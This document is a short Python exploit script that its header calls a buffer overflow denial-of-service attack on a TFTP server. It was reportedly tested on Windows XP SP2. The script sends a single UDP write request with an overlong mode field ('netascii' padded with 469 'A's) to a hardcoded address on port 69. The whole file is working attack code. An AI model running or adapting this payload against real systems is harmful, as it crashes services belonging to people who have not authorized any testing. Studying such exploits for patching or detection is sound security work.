#!/usr/bin/python
# Buffer Overflow (Long transporting mode) Vulnerability Exploit
# This is just a DoS exploiting code
# Tested on Windows xp SP2
#
# Requires python and impacket
#
# Coded by Liu Qixu Of NCNIPC

import socket
import sys

host = '192.168.1.11'
port = 69

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
    print "socket() failed"
    sys.exit(1)

filename = "A"
mode = "netascii" + "A" * 469
da = "\x00\x02" + filename + "\0" + mode + "\0"
s.sendto(da, (host, port))

